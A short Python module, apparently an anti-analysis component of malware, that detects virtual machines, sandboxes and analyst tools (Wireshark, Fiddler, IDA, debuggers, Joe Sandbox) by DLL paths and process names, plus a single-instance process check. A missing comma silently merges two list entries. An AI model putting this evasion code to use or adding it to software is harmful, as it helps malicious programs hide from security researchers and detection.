import psutil
import os

def protection_check():
    vm_files = [
        "C:\\windows\\system32\\vmGuestLib.dll",
        "C:\\windows\\system32\\vm3dgl.dll",
        "C:\\windows\\system32\\vboxhook.dll",
        "C:\\windows\\system32\\vboxmrxnp.dll",
        "C:\\windows\\system32\\vmsrvc.dll",
        "C:\\windows\\system32\\drivers\\vmsrvc.sys"
    ]
    blacklisted_processes = [
        'vmtoolsd.exe', 
        'vmwaretray.exe', 
        'vmwareuser.exe'
        'fakenet.exe', 
        'dumpcap.exe', 
        'httpdebuggerui.exe', 
        'wireshark.exe', 
        'fiddler.exe', 
        'vboxservice.exe', 
        'df5serv.exe', 
        'vboxtray.exe', 
        'vmwaretray.exe', 
        'ida64.exe', 
        'ollydbg.exe', 
        'pestudio.exe', 
        'vgauthservice.exe', 
        'vmacthlp.exe', 
        'x96dbg.exe', 
        'x32dbg.exe', 
        'prl_cc.exe', 
        'prl_tools.exe', 
        'xenservice.exe', 
        'qemu-ga.exe', 
        'joeboxcontrol.exe', 
        'ksdumperclient.exe', 
        'ksdumper.exe', 
        'joeboxserver.exe', 
    ]

    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'].lower() in blacklisted_processes:
            return True
    for file_path in vm_files:
        if os.path.exists(file_path):
            return True


    return False

def fake_mutex_code(exe_name: str) -> bool:
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'].lower() == exe_name:
            return True
        
    return False